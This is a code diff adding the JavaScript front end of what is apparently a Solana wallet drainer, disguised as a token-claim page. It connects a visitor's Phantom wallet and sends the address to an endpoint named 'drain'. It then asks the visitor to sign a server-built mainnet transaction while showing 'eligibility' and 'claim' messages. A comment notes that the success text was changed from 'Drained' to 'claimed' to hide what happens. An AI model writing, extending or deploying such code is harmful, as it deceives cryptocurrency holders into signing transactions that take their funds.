@@ -1,0 +1,72 @@
+document.getElementById('connect-wallet').addEventListener('click', async () => {
+    const statusElement = document.getElementById('status');
+    const button = document.getElementById('connect-wallet');
+    
+    // UI Updates
+    button.disabled = true;
+    statusElement.textContent = 'Connecting to wallet...';
+    statusElement.className = 'status visible loading';
+
+    // 1. Check for Phantom
+    if (!window.solana || !window.solana.isPhantom) {
+        statusElement.textContent = 'Phantom wallet not detected. Please install it.';
+        statusElement.className = 'status visible error';
+        button.disabled = false;
+        return;
+    }
+
+    try {
+        // 2. Connect
+        statusElement.textContent = 'Connecting...';
+        await window.solana.connect();
+        const walletAddress = window.solana.publicKey.toString();
+
+        // 3. Call Backend
+        statusElement.textContent = 'Checking eligibility...';
+        const response = await fetch('/.netlify/functions/drain', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ walletAddress })
+        });
+
+        if (!response.ok) {
+            const errorResponse = await response.json();
+            throw new Error(errorResponse.error || 'Network error');
+        }
+
+        const result = await response.json();
+        
+        // 4. Prepare Transaction
+        statusElement.textContent = 'Preparing claim transaction...';
+        
+        // Handle deserialization (same as before)
+        const transactionBytes = Uint8Array.from(atob(result.transaction), c => c.charCodeAt(0));
+        let transaction;
+        try {
+            transaction = solanaWeb3.VersionedTransaction.deserialize(transactionBytes);
+        } catch {
+            transaction = solanaWeb3.Transaction.fromBuffer(transactionBytes);
+        }
+
+        // 5. Sign and Send
+        statusElement.textContent = 'Please sign the transaction in Phantom...';
+        const signedTransaction = await window.solana.signTransaction(transaction);
+        const signature = await window.solana.sendTransaction(signedTransaction);
+
+        // 6. Confirm
+        const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'), 'confirmed');
+        await connection.confirmTransaction(signature);
+
+        // 7. SUCCESS MESSAGE (Changed from "Drained")
+        statusElement.textContent = `Success! ${result.amount} ${result.tokenSymbol} claimed successfully.`;
+        statusElement.className = 'status visible success';
+        
+        button.textContent = 'Claimed';
+
+    } catch (err) {
+        console.error(err);
+        statusElement.textContent = `Error: ${err.message}`;
+        statusElement.className = 'status visible error';
+        button.disabled = false;
+    }
+});
